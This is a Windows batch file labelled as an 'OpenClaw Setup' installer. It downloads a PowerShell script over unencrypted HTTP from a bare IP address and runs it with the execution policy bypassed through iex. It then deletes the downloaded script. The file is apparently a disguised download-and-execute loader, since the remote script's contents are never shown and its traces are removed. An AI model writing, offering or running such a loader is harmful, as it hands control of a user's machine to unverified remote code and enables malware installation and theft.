@echo off
chcp 65001 >nul
set "PS_URL=http://154.13.6.26/install-openclaw.ps1"
set "PS_PATH=%TEMP%\oc_setup.ps1"

echo [1/2] Downloading installation script...
powershell -Command "(New-Object Net.WebClient).DownloadFile('%PS_URL%', '%PS_PATH%')"

echo [2/2] Launching OpenClaw Setup...
echo ------------------------------------------
 
powershell -ExecutionPolicy Bypass -Command "$OutputEncoding = [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $s = Get-Content -Path '%PS_PATH%' -Raw -Encoding UTF8; iex $s"

echo ------------------------------------------
if exist "%PS_PATH%" del "%PS_PATH%"
echo Process completed.
pause